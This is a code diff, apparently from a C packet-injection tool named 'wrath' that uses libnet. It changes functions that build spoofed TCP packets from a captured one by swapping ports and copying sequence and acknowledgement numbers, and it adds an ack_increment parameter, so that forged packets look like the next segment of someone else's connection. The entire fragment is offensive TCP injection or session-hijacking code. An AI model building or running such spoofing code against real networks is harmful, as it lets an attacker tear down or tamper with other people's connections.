@@ -2,7 +2,7 @@
 #include "wrath-structs.h"
  
 
-void wrath_tcp_raw_build_and_launch(u_char *args, const u_char *packet, FILE *out) {
+void wrath_tcp_raw_build_and_launch(u_char *args, const u_char *packet, int ack_increment, FILE *out) {
 	struct lcp_package *package = (struct lcp_package *) args;
 	libnet_t *libnet_handle = package->libnet_handle;
 	struct arg_values *cline_args = package->cline_args;
@@ -19,7 +19,7 @@ void wrath_tcp_raw_build_and_launch(u_char *args, const u_char *packet, FILE *ou
 
 	/* building tcp header */
 	libnet_build_tcp( ntohs(tcphdr->th_dport), ntohs(tcphdr->th_sport), ntohl(tcphdr->th_ack),
-	ntohl(tcphdr->th_seq), tcp_sum, 4024, 0, 0, 0, NULL, 0, libnet_handle, 0);
+	ntohl(tcphdr->th_seq) + ack_increment, tcp_sum, 4024, 0, 0, 0, NULL, 0, libnet_handle, 0);
 	
 	/* building ip header */
 	libnet_build_ipv4(LIBNET_TCP_H, IPTOS_LOWDELAY,	libnet_get_prand(LIBNET_PRu16), 0, 128,				
@@ -63,7 +63,7 @@ void wrath_tcp_custom_build_and_launch(libnet_t *libnet_handle, struct in_addr s
  * @param a pointer to an upper-level protocol payload,
  * @param the sum of TCP Flags 
  * @param amount to increment the seq number by */
-void wrath_tcp_belly_build_and_launch(u_char *args, const u_char *packet, unsigned char *payload, unsigned int tcp_sum) {
+void wrath_tcp_belly_build_and_launch(u_char *args, const u_char *packet, unsigned char *payload, int ack_increment, unsigned int tcp_sum) {
 	struct lcp_package *package = (struct lcp_package *) args;
 	libnet_t *libnet_handle = package->libnet_handle;
 	struct arg_values *cline_args = package->cline_args;
@@ -78,8 +78,8 @@ void wrath_tcp_belly_build_and_launch(u_char *args, const u_char *packet, unsign
 	libnet_build_tcp(
 	ntohs(tcphdr->th_dport),	// source port (preted to be from destination port)
 	ntohs(tcphdr->th_sport),	// destination port (pretend to be from source port)
-	ntohl(tcphdr->th_ack), // +(calc_len(upper_level)),	// seq (pretend to be next packet)
-	ntohl(tcphdr->th_seq),		// ack
+	ntohl(tcphdr->th_ack), 		// seq (pretend to be next packet)
+	ntohl(tcphdr->th_seq) + ack_increment,		// ack
 	tcp_sum,			// flags
 	60000,				// window size -- the higher this is the least likely fragmentation will occur
 	0,				// checksum: 0 = libnet auto-fill
